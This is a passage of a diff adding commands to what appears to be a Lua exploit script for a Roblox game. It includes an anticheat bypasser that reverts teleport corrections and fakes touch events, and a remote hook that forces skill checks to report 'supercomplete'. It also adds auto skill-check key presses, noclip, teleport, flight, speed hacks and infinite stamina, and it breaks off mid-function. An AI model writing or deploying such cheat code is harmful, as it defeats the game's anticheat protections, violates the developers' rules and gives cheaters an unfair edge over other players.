+			antiCheatTrigger:Destroy()
+		end
+	end
+	notify("The anticheat isnt fully removed.", 5, "warning")
+end)
+
+allownexttp = false
+bypassinganticheat = false
+
+function allowteleport() allownexttp = true end
+
+addcommand("enableanticheatbypasser", "eacb", function()
+	if bypassinganticheat then return end
+	bypassinganticheat = true
+	local oldCF
+	local settingCF = false
+
+	getgenv().allowteleport = allowteleport
+
+	local hrp = noxious["character"]:WaitForChild("HumanoidRootPart")
+
+	hrp:GetPropertyChangedSignal("CFrame"):Connect(function()
+		if settingCF then return end
+		if allownexttp then
+			allownexttp = false
+			oldCF = hrp.CFrame
+			return
+		end
+
+		settingCF = true
+		hrp.CFrame = oldCF or hrp.CFrame
+		settingCF = false
+
+		if not noxious["local player"]:GetAttribute("isBeingTeleported") then
+			if not inrun() then return end
+			firetouchinterest(workspace.BaseplateTrigger, hrp, 1)
+			firetouchinterest(workspace.BaseplateTrigger, hrp, 0)
+		end
+	end)
+
+	while task.wait() do
+		oldCF = hrp.CFrame
+	end
+end)
+
+addcommand("disableanticheatbypasser", "dacb", function()
+	if not bypassinganticheat then return end
+	bypassinganticheat = false
+	local hrp = noxious["character"]:WaitForChild("HumanoidRootPart")
+
+	getgenv().allowteleport = nil
+	getfenv().oldCF = nil
+	getfenv().settingCF = nil
+
+	for _, conn in ipairs(getconnections(hrp:GetPropertyChangedSignal("CFrame"))) do
+		conn:Disable()
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("changeskin", "cs", function()
+	local players = game:GetService("Players")
+	local replicatedStorage = game:GetService("ReplicatedStorage")
+	local workspacePlayers = workspace:FindFirstChild("Players") or workspace:FindFirstChild("InGamePlayers")
+
+	local IndexSkin = 1
+
+	local function GetActualToon()
+		local localPlayer = players.LocalPlayer
+		local playerConfig = workspacePlayers:FindFirstChild(localPlayer.Name) and workspacePlayers[localPlayer.Name]:FindFirstChild("Config")
+		if playerConfig and playerConfig:FindFirstChild("CharacterName") then
+			return playerConfig.CharacterName.Value
+		else
+			return nil
+		end
+	end
+
+	local function GetCharacter()
+		local localPlayer = workspacePlayers:FindFirstChild(noxious["local player"].Name)
+		if localPlayer  then
+			return localPlayer
+		else
+			return nil
+		end
+	end
+
+	local function GetSkins(characterName)
+		if characterName and replicatedStorage:FindFirstChild("Skins") then
+			return replicatedStorage.Skins:FindFirstChild(characterName)
+		else
+			return nil
+		end
+	end
+
+	local function ApplySkin(module)
+		local character = GetCharacter()
+		if not character then return end
+
+		local requiredModule = require(module)
+		if requiredModule.ApplySkin then
+			requiredModule.ApplySkin(character)
+		end
+	end
+
+	local function Reset()
+		IndexSkin = 0
+	end
+
+	local characterName = GetActualToon()
+	local skinsFolder = GetSkins(characterName)
+
+	if not skinsFolder then
+		notify("Your Toon doesn't seem to have any skins.", 5, "error")
+		return
+	end
+
+	local skins = skinsFolder:GetChildren()
+	if #skins == 0 then
+		return
+	end
+
+	IndexSkin = IndexSkin + 1
+	if IndexSkin > #skins then
+		Reset()return
+	end
+
+	local selectedSkin = skins[IndexSkin]
+	if selectedSkin then
+		ApplySkin(selectedSkin)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("floatlay", "flay", function()
+	local b = noxious["character"]:WaitForChild("Body", 5)
+	if not b or not b:IsA("BasePart") then
+		return
+	end
+
+	for _, child in ipairs(b:GetChildren()) do
+		if child:IsA("AlignOrientation") or child:IsA("Attachment") then
+			child:Destroy()
+		end
+	end
+
+	b.Anchored = false
+
+	local a = Instance.new("Attachment", b)
+	local ao = Instance.new("AlignOrientation")
+	ao.Attachment0 = a
+	ao.Mode = Enum.OrientationAlignmentMode.OneAttachment
+	ao.CFrame = CFrame.Angles(math.rad(90), 0, 0)
+	ao.RigidityEnabled = true
+	ao.Responsiveness = math.huge
+	ao.Parent = b
+end)
+
+addcommand("unfloatlay", "unflay", function()
+	local b = noxious["character"]:WaitForChild("Body", 5)
+	for _, child in ipairs(b:GetChildren()) do
+		if child:IsA("AlignOrientation") or child:IsA("Attachment") then
+			child:Destroy()
+			execcmd("unview")
+		end
+	end
+end)
+
+addcommand("upsidedown", "dinnerbone", function()
+	local b = noxious["character"]:WaitForChild("Body", 5)
+	if not b or not b:IsA("BasePart") then
+		return
+	end
+
+	for _, child in ipairs(b:GetChildren()) do
+		if child:IsA("AlignOrientation") or child:IsA("Attachment") then
+			child:Destroy()
+		end
+	end
+
+	b.Anchored = false
+
+	local a = Instance.new("Attachment", b)
+	local ao = Instance.new("AlignOrientation")
+	ao.Attachment0 = a
+	ao.Mode = Enum.OrientationAlignmentMode.OneAttachment
+	ao.CFrame = CFrame.Angles(math.rad(180), 0, 0)
+	ao.RigidityEnabled = true
+	ao.Responsiveness = math.huge
+	ao.Parent = b
+end)
+
+addcommand("rightsideup", "undinnerbone", function()
+	local b = noxious["character"]:WaitForChild("Body", 5)
+	for _, child in ipairs(b:GetChildren()) do
+		if child:IsA("AlignOrientation") or child:IsA("Attachment") then
+			child:Destroy()
+			execcmd("unview")
+		end
+	end
+end)
+
+addcommand("rotate", "rotate", function(x, y, z)
+	local b = noxious["character"]:WaitForChild("Body", 5)
+	if not b or not b:IsA("BasePart") then
+		return
+	end
+
+	for _, child in ipairs(b:GetChildren()) do
+		if child:IsA("AlignOrientation") or child:IsA("Attachment") then
+			child:Destroy()
+		end
+	end
+
+	b.Anchored = false
+
+	local rx = tonumber(x) or 0
+	local ry = tonumber(y) or 0
+	local rz = tonumber(z) or 0
+
+	for _, child in pairs(b:GetChildren()) do
+		if child:IsA("AlignOrientation") then
+			child:Destroy()
+		end
+	end
+	for _, child in pairs(b:GetChildren()) do
+		if child:IsA("Attachment") then
+			child:Destroy()
+		end
+	end
+
+	local a = Instance.new("Attachment", b)
+	local ao = Instance.new("AlignOrientation")
+	ao.Attachment0 = a
+	ao.Mode = Enum.OrientationAlignmentMode.OneAttachment
+	ao.CFrame = CFrame.Angles(math.rad(rx), math.rad(ry), math.rad(rz))
+	ao.RigidityEnabled = true
+	ao.Responsiveness = math.huge
+	ao.Parent = b
+end)
+
+function switchcamerasubject(bodypart)
+	local player = game:GetService("Players").LocalPlayer
+	local character = player.Character or player.CharacterAdded:Wait()
+	local bodyPart = character:FindFirstChild(bodypart)
+
+	if bodyPart and bodyPart:IsA("BasePart") then
+		workspace.CurrentCamera.CameraSubject = bodyPart
+	end
+end
+
+addcommand("convulse", "convulse", function()
+	switchcamerasubject("Body")
+	local b = noxious["character"]:WaitForChild("Body", 5)
+	if not b or not b:IsA("BasePart") then
+		return
+	end
+
+	for _, child in ipairs(b:GetChildren()) do
+		if child:IsA("AlignOrientation") or child:IsA("Attachment") then
+			child:Destroy()
+		end
+	end
+
+	b.Anchored = false
+
+	local a = Instance.new("Attachment", b)
+	local ao = Instance.new("AlignOrientation")
+	ao.Attachment0 = a
+	ao.Mode = Enum.OrientationAlignmentMode.OneAttachment
+	ao.RigidityEnabled = true
+	ao.Responsiveness = math.huge
+	ao.Parent = b
+
+	task.spawn(function()
+		while true do
+			local rx = math.rad(math.random(-360, 360))
+			local ry = math.rad(math.random(-360, 360))
+			local rz = math.rad(math.random(-360, 360))
+			ao.CFrame = CFrame.Angles(rx, ry, rz)
+			task.wait(0)
+		end
+	end)
+end)
+
+addcommand("unconvulse", "unconvulse", function()
+	execcmd("rec")
+end)
+
+addcommand("xspin", "xspin", function(speed)
+	speed = tonumber(speed) or 10
+
+	switchcamerasubject("Body")
+	local b = noxious["character"]:WaitForChild("Body", 5)
+	if not b or not b:IsA("BasePart") then
+		return
+	end
+
+	for _, child in ipairs(b:GetChildren()) do
+		if child:IsA("AlignOrientation") or child:IsA("Attachment") then
+			child:Destroy()
+		end
+	end
+
+	b.Anchored = false
+
+	local a = Instance.new("Attachment", b)
+	local ao = Instance.new("AlignOrientation")
+	ao.Attachment0 = a
+	ao.Mode = Enum.OrientationAlignmentMode.OneAttachment
+	ao.RigidityEnabled = true
+	ao.Responsiveness = math.huge
+	ao.Parent = b
+
+	local angle = 0
+	task.spawn(function()
+		while true do
+			angle += math.rad(speed)
+			ao.CFrame = CFrame.Angles(angle, 0, 0)
+			task.wait()
+		end
+	end)
+end)
+
+addcommand("zspin", "zspin", function(speed)
+	speed = tonumber(speed) or 10
+
+	switchcamerasubject("Body")
+	local b = noxious["character"]:WaitForChild("Body", 5)
+	if not b or not b:IsA("BasePart") then
+		return
+	end
+
+	for _, child in ipairs(b:GetChildren()) do
+		if child:IsA("AlignOrientation") or child:IsA("Attachment") then
+			child:Destroy()
+		end
+	end
+
+	b.Anchored = false
+
+	local a = Instance.new("Attachment", b)
+	local ao = Instance.new("AlignOrientation")
+	ao.Attachment0 = a
+	ao.Mode = Enum.OrientationAlignmentMode.OneAttachment
+	ao.RigidityEnabled = true
+	ao.Responsiveness = math.huge
+	ao.Parent = b
+
+	local angle = 0
+	task.spawn(function()
+		while true do
+			angle += math.rad(speed)
+			ao.CFrame = CFrame.Angles(0, 0, angle)
+			task.wait()
+		end
+	end)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local autocalibration = false
+
+function handleSkillCheck()
+	local VIM = game:GetService'VirtualInputManager'		
+	local tl = 5
+	local screengui = noxious["local player"].PlayerGui:FindFirstChild("ScreenGui")		
+	if not screengui then
+		return
+	end
+
+	local menu = screengui:FindFirstChild("Menu")	
+	if not menu then
+		return
+	end
+
+	local skillcheckframe = menu:FindFirstChild("SkillCheckFrame")		
+	if not skillcheckframe then
+		return
+	end
+
+	local function visibledisrupt()
+		if autocalibration and skillcheckframe.Visible then
+			local marker = skillcheckframe:FindFirstChild("Marker")				
+			local goldarea = skillcheckframe:FindFirstChild("GoldArea")
+
+			if marker and goldarea then
+				local markerPosition = marker.AbsolutePosition
+				local goldAreaPosition = goldarea.AbsolutePosition
+				local goldAreaSize = goldarea.AbsoluteSize
+
+				if markerPosition.X >= goldAreaPosition.X and markerPosition.X <= (goldAreaPosition.X + goldAreaSize.X) + tl then
+					VIM:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
+				end
+			end
+		end
+	end
+
+	skillcheckframe.Changed:Connect(function(property)
+		if property == "Visible" then
+			visibledisrupt()
+		end
+	end)
+
+	local marker = skillcheckframe:FindFirstChild("Marker")		
+	local goldarea = skillcheckframe:FindFirstChild("GoldArea")
+
+	if marker then
+		marker.Changed:Connect(function(property)
+			if property == "AbsolutePosition" then
+				visibledisrupt()
+			end
+		end)
+	end
+
+	if goldarea then
+		goldarea.Changed:Connect(function(property)
+			if property == "AbsolutePosition" or property == "AbsoluteSize" then
+				visibledisrupt()
+			end
+		end)
+	end
+end
+
+addcommand("enableautocalibration", "eac", function()
+	task.spawn(handleSkillCheck)
+	autocalibration = true
+end)
+
+addcommand("disableautocalibration", "dac", function()
+	autocalibration = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("enableautocalibration2", "eac2", function()
+	noxious["replicated storage"].Events.SkillcheckUpdate.OnClientInvoke = function() return "supercomplete" end
+end)
+
+addcommand("disableautocalibration2", "dac2", function()
+	local skillcheckEvent = game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("SkillcheckUpdate")
+	skillcheckEvent.OnClientInvoke = nil
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("fov", "fov", function(value)
+	local playerCamera = game.Workspace.CurrentCamera
+	if playerCamera then
+		playerCamera.FieldOfView = value
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+stretchcamconn = nil
+
+addcommand("stretchcamera", "scam", function(x, y)
+	local stretchcamerax = tonumber(x) or 1
+	local stretchcameray = tonumber(y) or 1
+	if stretchcamconn then
+		stretchcamconn:Disconnect()
+		stretchcamconn = nil
+	end
+	stretchcamconn = noxious["run service"].RenderStepped:Connect(function()
+		local MAGIC_FORMULA = CFrame.new(0, 0, 0, stretchcameray, 0, 0, 0, stretchcamerax, 0, 0, 0, 1)
+		game.workspace.Camera.CFrame = game.workspace.Camera.CFrame * MAGIC_FORMULA
+	end)
+end)
+
+addcommand("unstretchcamera", "unscam", function(value)
+	if stretchcamconn then
+		stretchcamconn:Disconnect()
+		stretchcamconn = nil
+	end
+	local MAGIC_FORMULA = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+	game.workspace.Camera.CFrame = game.workspace.Camera.CFrame * MAGIC_FORMULA
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("maxzoom", "maxzoom", function(value)
+	noxious["local player"].CameraMaxZoomDistance = value
+end)
+
+addcommand("minzoom", "minzoom", function(value)
+	noxious["local player"].CameraMinZoomDistance = value
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+tpwalking = false
+tpwalkcurrentspeed = 10
+
+addcommand("teleportwalk", "tpwalk", function(speed)
+	tpwalking = false
+	tpwalking = true
+	local chr = noxious["character"]
+	local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")		
+	local hb = noxious["run service"].Heartbeat
+
+	while tpwalking and chr and hum and hum.Parent do
+		local delta = hb:Wait()
+		if hum.MoveDirection.Magnitude > 0 then
+			if speed and tonumber(speed) then
+				tpwalkcurrentspeed = tonumber(speed)
+			end
+			chr:TranslateBy(hum.MoveDirection * tpwalkcurrentspeed * delta * 10)
+		end
+	end
+end)
+
+addcommand("unteleportwalk", "untpwalk", function()
+	tpwalking = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local CFloop
+
+addcommand("clipframefly", "cffly", function(speed)
+	if not speed then speed = 70 end
+	local character = noxious["character"]
+	if not character then return end
+
+	local humanoid = character:FindFirstChildOfClass("Humanoid")		
+	local head = character:WaitForChild("Head")	
+
+	if humanoid and head then
+		humanoid.PlatformStand = true
+		head.Anchored = true
+
+		if CFloop then CFloop:Disconnect() end
+
+		CFloop = noxious["run service"].Heartbeat:Connect(function(deltaTime)
+			local moveDirection = humanoid.MoveDirection * (speed * deltaTime)
+			local headCFrame = head.CFrame
+			local cameraCFrame = workspace.CurrentCamera.CFrame
+			local cameraOffset = headCFrame:ToObjectSpace(cameraCFrame).Position
+
+			cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
+			local cameraPosition = cameraCFrame.Position
+			local headPosition = headCFrame.Position
+
+			local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
+			head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
+		end)
+	end
+end)
+
+addcommand("unclipframefly", "uncffly", function()
+	local character = noxious["character"]
+	if not character then return end
+
+	local humanoid = character:FindFirstChildOfClass("Humanoid")		
+	local head = character:FindFirstChild("Head")
+
+	if CFloop then CFloop:Disconnect() end
+	if humanoid then humanoid.PlatformStand = false end
+	if head then head.Anchored = false end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("teleporttool", "tptool", function()
+	local function hi()
+		local maus = noxious["local player"]:GetMouse()
+		local tool = Instance.new("Tool")
+		tool.Name = "teleport tool"
+		tool.RequiresHandle = false
+		tool.Parent = noxious["local player"].Backpack
+		tool.Activated:Connect(function()
+			task.spawn(allowteleport)
+			noxious["humanoid root part"].CFrame = CFrame.new(maus.Hit.X, maus.Hit.Y + 3, maus.Hit.Z, select(4, noxious["humanoid root part"].CFrame:components()))
+		end)
+		game:GetService"StarterGui":SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+	end
+	hi()
+	noxious["local player"].CharacterAdded:Connect(hi)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("reset", "re", function()
+	local sp
+	local so
+
+	local function scs(character)
+		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+		if humanoidRootPart then
+			sp = humanoidRootPart.Position
+			so = humanoidRootPart.Orientation
+		end
+	end
+
+	local function kc(character)
+		local humanoid = character:FindFirstChildOfClass("Humanoid")
+		if humanoid then
+			humanoid.Health = 0
+		end
+	end
+
+	local function oca(character)
+		task.delay(0.2, function()
+			if sp and so then
+				character:WaitForChild("HumanoidRootPart")
+				character:SetPrimaryPartCFrame(CFrame.new(sp) * CFrame.Angles(0, math.rad(so.Y), 0))
+			end
+
+			sp = nil
+			so = nil
+		end)
+	end
+
+	local function sktp(player)
+		local character = player.Character or player.CharacterAdded:Wait()
+		scs(character)
+		kc(character)
+		player.CharacterAdded:Connect(oca)
+	end
+
+	sktp(noxious["local player"])
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("die", "die", function()
+	local humanoid = noxious["character"]:FindFirstChild("Humanoid")
+
+	if humanoid then
+		humanoid.Health = 0
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function createNoclip()
+	local connections = {}
+	local touchedObjects = {}
+
+	local function shouldIgnorePart(part)
+		if string.match(part.Name, "Sphere$") then
+			return true
+		end
+
+		if part.Name == "MonsterBlocker" then
+			return true
+		end
+
+		if part:IsDescendantOf(noxious["character"]) then
+			return true
+		end
+
+		return false
+	end
+
+	local function disableCollision(part)
+		if part and part:IsA("BasePart") and not shouldIgnorePart(part) then
+			if part.CanCollide then
+				part.CanCollide = false
+				touchedObjects[part] = true
+			end
+		end
+	end
+
+	local function enableCollision(part)
+		if part and part:IsA("BasePart") and touchedObjects[part] then
+			part.CanCollide = true
+			touchedObjects[part] = nil
+		end
+	end
+
+	local function onTouched(otherPart)
+		if not otherPart or not otherPart:IsA("BasePart") then return end
+
+		if shouldIgnorePart(otherPart) then return end
+
+		if otherPart.Name == "Baseplate" then
+			local elevatorsFolder = workspace:FindFirstChild("Elevators")                
+			if elevatorsFolder then
+				local elevatorModel = elevatorsFolder:FindFirstChildWhichIsA("Model")                    
+				if elevatorModel then
+					local monsterBlocker = elevatorModel:FindFirstChild("MonsterBlocker")                        
+					if monsterBlocker and monsterBlocker:IsA("Part") then
+						noxious["character"]:SetPrimaryPartCFrame(monsterBlocker.CFrame)
+					end
+				end
+			end
+			return
+		end
+
+		if not touchedObjects[otherPart] then
+			disableCollision(otherPart)
+		end
+	end
+
+	local function onTouchEnded(otherPart)
+		if otherPart and otherPart:IsA("BasePart") then
+			enableCollision(otherPart)
+		end
+	end
+
+	local function enableNoclip()
+		local character = noxious["character"]
+		local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+		if not connections.touched then
+			connections.touched = humanoidRootPart.Touched:Connect(onTouched)
+		end
+		if not connections.touchEnded then
+			connections.touchEnded = humanoidRootPart.TouchEnded:Connect(onTouchEnded)
+		end
+	end
+
+	local function disableNoclip()
+		for _, conn in pairs(connections) do
+			conn:Disconnect()
+		end
+		connections = {}
+
+		for part in pairs(touchedObjects) do
+			enableCollision(part)
+		end
+		touchedObjects = {}
+	end
+
+	return enableNoclip, disableNoclip
+end
+
+local enableNoclip, disableNoclip = createNoclip()
+
+noclipping = false
+
+addcommand("noclip", "noclip", function()
+	noclipping = true
+	enableNoclip()
+end)
+
+addcommand("unnoclip", "clip", function()
+	noclipping = false
+	disableNoclip()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+looprunspeedenabled = true
+looprunspeedupdateloop = nil
+looprunspeedlastmoving = false
+
+function looprunspeed()
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoid = character:WaitForChild("Humanoid")
+	local rootPart = character:WaitForChild("HumanoidRootPart")
+	local statsFolder = character:WaitForChild("Stats")
+	local runSpeed = statsFolder:WaitForChild("RunSpeed")
+	local modifier = statsFolder:FindFirstChild("RunSpeedModifier")
+
+	looprunspeedlastmoving = false
+
+	local playerModel = workspace:FindFirstChild("Players") or workspace:FindFirstChild("InGamePlayers")
+	local toonNameValue = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild("ToonName")
+
+	local characterName
+	if not toonNameValue then
+		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild("Config")
+		local charNameValue = config and config:FindFirstChild("CharacterName")
+		if charNameValue and charNameValue:IsA("StringValue") then
+			characterName = charNameValue.Value
+		end
+	end
+
+	local toon = (toonNameValue and toonNameValue.Value) or characterName or ""
+	local isOldRig = table.find(noxious["toons with old animation rigs"], toon)
+
+	if not looprunspeedupdateloop then
+		looprunspeedenabled = true
+		looprunspeedupdateloop = coroutine.create(function()
+			while looprunspeedenabled do
+				local finalSpeed = runSpeed.Value
+				if modifylooprunspeed and modifier and modifier:IsA("NumberValue") then
+					finalSpeed *= modifier.Value
+				end
+				humanoid.WalkSpeed = finalSpeed
+
+				local velocity = rootPart.Velocity
+				local isMoving = velocity.Magnitude > 1
+
+				if not isOldRig then
+					if isMoving and not looprunspeedlastmoving then
+						enableAnimationLoop("Run")
+					elseif not isMoving and looprunspeedlastmoving then
+						disableAnimationLoop("Run")
+					end
+				end
+
+				looprunspeedlastmoving = isMoving
+				task.wait(0)
+			end
+		end)
+		coroutine.resume(looprunspeedupdateloop)
+	end
+end
+
+addcommand("enablelooprunspeed", "elrs", function()
+	if not looprunspeedupdateloop then
+		looprunspeedenabled = true
+		looprunspeed()
+	end
+end)
+
+addcommand("disablelooprunspeed", "dlrs", function()
+	game:GetService("ReplicatedStorage").Events.SprintEvent:FireServer(false)
+
+	if looprunspeedupdateloop then
+		looprunspeedenabled = false
+		looprunspeedupdateloop = nil
+		looprunspeedlastmoving = false
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+autosprintconnection = nil
+
+addcommand("enableautosprint", "eas", function()
+	if not autosprintconnection then
+		autosprintconnection = noxious["replicated storage"].StoryEvents.Spotted.OnClientEvent:Connect(function()
+			game:GetService("ReplicatedStorage").Events.SprintEvent:FireServer(true)
+		end)
+	end
+end)
+
+addcommand("disableautosprint", "das", function()
+	if autosprintconnection then
+		autosprintconnection:Disconnect()
+		autosprintconnection = nil
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["character modification connections"] = {}
+
+loopspeedlastwalkspeed = nil
+
+addcommand("loopspeed", "ls", function(s)
+	local speed = tonumber(s) or 16
+	if tonumber(s) then
+		speed = tonumber(s) or 16
+	end
+	local function isNumber(str)
+		if tonumber(str) ~= nil or str == 'inf' then
+			return true
+		end
+	end
+	if isNumber(speed) then
+		loopspeedlastwalkspeed = noxious["humanoid"]["WalkSpeed"]
+		local Char = noxious["character"] or workspace:FindFirstChild(noxious["username"])
+		local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
+		local function WalkSpeedChange()
+			if Char and Human then
+				Human.WalkSpeed = speed
+			end
+		end
+		WalkSpeedChange()
+		noxious["character modification connections"].wsLoop = (noxious["character modification connections"].wsLoop and noxious["character modification connections"].wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(WalkSpeedChange)
+		noxious["character modification connections"].wsCA = (noxious["character modification connections"].wsCA and noxious["character modification connections"].wsCA:Disconnect() and false) or noxious["local player"].CharacterAdded:Connect(function(nChar)
+			Char, Human = nChar, nChar:WaitForChild("Humanoid")
+			WalkSpeedChange()
+			noxious["character modification connections"].wsLoop = (noxious["character modification connections"].wsLoop and noxious["character modification connections"].wsLoop:Disconnect() and false) or Human:GetPropertyChangedSignal("WalkSpeed"):Connect(WalkSpeedChange)
+		end)
+	end
+end)
+
+addcommand("unloopspeed", "unls", function()
+	noxious["character modification connections"].wsLoop = (noxious["character modification connections"].wsLoop and noxious["character modification connections"].wsLoop:Disconnect() and false) or nil
+	noxious["character modification connections"].wsCA = (noxious["character modification connections"].wsCA and noxious["character modification connections"].wsCA:Disconnect() and false) or nil
+	noxious["humanoid"]["WalkSpeed"] = loopspeedlastwalkspeed
+	loopspeedlastwalkspeed = nil
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+pulsespeedingenabled = false
+pulsespeedingthread = nil
+pulsespeedlastwalkspeed = nil
+
+addcommand("pulsespeed", "pspeed", function(speed)
+	task.spawn(function() execcmd("dis") end)
+	task.spawn(function() execcmd("dlms") end)
+	task.spawn(function() execcmd("dlrs") end)
+	task.spawn(function() execcmd("unls") end)
+
+	speed = tonumber(speed)
+	if not speed then return end
+
+	local character = noxious["character"]
+	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+	if not humanoid then return end
+
+	pulsespeedlastwalkspeed = humanoid.WalkSpeed
+	pulsespeedingenabled = true
+
+	if pulsespeedingthread then
+		coroutine.close(pulsespeedingthread)
+	end
+
+	pulsespeedingthread = coroutine.create(function()
+		while pulsespeedingenabled do
+			local char = noxious["character"]
+			local hum = char and char:FindFirstChildOfClass("Humanoid")
+			if hum then
+				hum.WalkSpeed = speed
+				task.wait(0.5)
+				if not pulsespeedingenabled then break end
+				hum.WalkSpeed = pulsespeedlastwalkspeed
+				task.wait(0.7)
+			else
+				break
+			end
+		end
+	end)
+
+	coroutine.resume(pulsespeedingthread)
+end)
+
+addcommand("unpulsespeed", "unpspeed", function()
+	pulsespeedingenabled = false
+
+	local character = noxious["character"]
+	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+	if humanoid and pulsespeedlastwalkspeed then
+		humanoid.WalkSpeed = pulsespeedlastwalkspeed
+	end
+
+	pulsespeedlastwalkspeed = nil
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+maxspeedlastwalkspeed = nil
+maxspeedfinalwalkspeed = nil
+maxspeedconnection = nil
+
+function calculateFinalWalkSpeed()
+	local char = noxious["character"]
+	local humanoid = noxious["character"]:FindFirstChild("Humanoid")
+	local config = char and char:FindFirstChild("Config")
+	if config then
+		local name = config:FindFirstChild("ModuleName")
+		if name and name.Value then
+			local elVal = require(noxious["replicated storage"].TowerData:WaitForChild(name.Value))
+			return elVal.RunSpeed + 6.5
+		end
+	end
+	return humanoid and humanoid.WalkSpeed or 16
+end
+
+function onWalkSpeedChanged(property)
+	local char = noxious["character"]
+	local humanoid = noxious["character"]:FindFirstChild("Humanoid")
+	if property ~= "WalkSpeed" then return end
+	if humanoid and maxspeedfinalwalkspeed then
+		humanoid.WalkSpeed = maxspeedfinalwalkspeed
+	end
+end
+
+addcommand("enableloopmaxspeed", "elms", function()
+	local char = noxious["character"]
+	local humanoid = noxious["character"]:FindFirstChild("Humanoid")
+	if not humanoid then return end
+	maxspeedlastwalkspeed = humanoid.WalkSpeed
+
+	maxspeedfinalwalkspeed = calculateFinalWalkSpeed()
+	humanoid.WalkSpeed = maxspeedfinalwalkspeed
+
+	maxspeedconnection = humanoid.Changed:Connect(onWalkSpeedChanged)
+end)
+
+addcommand("disableloopmaxspeed", "dlms", function()
+	local char = noxious["character"]
+	local humanoid = noxious["character"]:FindFirstChild("Humanoid")
+	if maxspeedconnection then
+		maxspeedconnection:Disconnect()
+		maxspeedconnection = nil
+	end
+
+	if humanoid and maxspeedlastwalkspeed then
+		humanoid.WalkSpeed = maxspeedlastwalkspeed
+	end
+	maxspeedlastwalkspeed = nil
+	maxspeedfinalwalkspeed = nil
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+infinitestaminaenabled = false
+sprintbuttonalreadyreplaced = false
+
+addcommand("enableinfinitestamina", "eis", function()
+	infinitestaminaenabled = true
+
+	if not sprintbuttonalreadyreplaced then
+		sprintbuttonalreadyreplaced = true
+		local UserInputService = game:GetService("UserInputService")
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local playerGui = player:WaitForChild("PlayerGui")
+		local screenGui = playerGui:WaitForChild("ScreenGui")
+
+		local originalButton = screenGui:WaitForChild("MobileRun")
+		local newButton = originalButton:Clone()
+		newButton.Name = "MobileRun"
+		newButton.Parent = screenGui
+		originalButton:Destroy()
+
+		local image1 = "rbxassetid://11866517702"
+		local image2 = "rbxassetid://11866539249"
+		newButton.Image = image1
+		local toggled = false
+
+		local looprunspeedenabled = false
+		local looprunspeedupdateloop = nil
+		local looprunspeedlastmoving = false
+
+		local function stoprunspeed()
+			looprunspeedenabled = false
+			looprunspeedupdateloop = nil
+			looprunspeedlastmoving = false
+
+			local character = player.Character
+			if character then
+				local humanoid = character:FindFirstChild("Humanoid")
+				local statsFolder = character:FindFirstChild("Stats")
+				local runSpeed = statsFolder and statsFolder:FindFirstChild("WalkSpeed")
+				if humanoid and runSpeed then
+					humanoid.WalkSpeed = runSpeed.Value
+				end
+			end
+		end
+
+		local function looprunspeed()
+			local character = player.Character or player.CharacterAdded:Wait()
+			local humanoid = character:WaitForChild("Humanoid")
+			local rootPart = character:WaitForChild("HumanoidRootPart")
+			local statsFolder = character:WaitForChild("Stats")
+			local runSpeed = statsFolder:WaitForChild("RunSpeed")
+			local modifier = statsFolder:FindFirstChild("RunSpeedModifier")
+
+			local playerModel = workspace:FindFirstChild("Players") or workspace:FindFirstChild("InGamePlayers")
+			local toonNameValue = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild("ToonName")
+
+			local characterName
+			if not toonNameValue then
+				local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild("Config")
+				local charNameValue = config and config:FindFirstChild("CharacterName")
+				if charNameValue and charNameValue:IsA("StringValue") then
+					characterName = charNameValue.Value
+				end
+			end
+
+			local toon = (toonNameValue and toonNameValue.Value) or characterName or ""
+			local isOldRig = table.find(noxious["toons with old animation rigs"], toon)
+
+			if looprunspeedupdateloop then return end
+
+			looprunspeedenabled = true
+			looprunspeedupdateloop = coroutine.create(function()
+				while looprunspeedenabled do
+					local finalSpeed = runSpeed.Value
+					if modifier and modifier:IsA("NumberValue") then
+						finalSpeed *= modifier.Value
+					end
+					if istoon("Looey") and humanoid.Health == 2 then finalSpeed = finalSpeed + 5 end
